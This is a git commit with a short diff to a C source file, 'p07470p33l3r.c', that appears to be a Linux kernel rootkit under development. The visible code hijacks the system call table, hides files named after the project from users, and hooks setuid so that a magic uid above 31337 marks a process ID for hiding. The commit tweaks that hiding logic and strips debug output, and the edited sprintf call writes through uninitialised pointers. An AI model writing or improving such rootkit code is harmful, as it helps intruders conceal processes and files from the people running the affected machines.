89ad5bb1eb24cd2a0ec0144fe51bdfc3eb99bab3
vfreak <vancejones53@gmail.com>
2017-05-19 13:35:40 -0700

    Idk anymore

--- p07470p33l3r.c
+++ p07470p33l3r.c
@@ -41,7 +41,7 @@ typedef unsigned long psize; // Set custom var psize to 8 bytes (64bits)
 psize *system_call_table; // Store syscall table location
 
 char *hide_file = "p07470p33l3r"; // Name of files/directories to hide from user
-char hidden_PIDs[50];
+char *hidden_PIDs[50];
 int index = 0;
 
 /* Hacked Syscall Pointers */
@@ -150,12 +150,8 @@ asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp, u
 
 asmlinkage int hacked_setuid(uid_t uid){
 	if(uid > 31337){
-		sprintf(&hidden_PIDs[index++], "%d", (uid - 31337));
+		sprintf(hidden_PIDs[index++], "%d", (uid - 31337));
 		printk("PID = %d\n", (uid - 31337));
-		int i;
-		for(i = 0; i < index; i++){
-			printk("List PIDs %s\n", hidden_PIDs[i]);
-		}
 	}
 	return (*orig_setuid)(uid);
 }
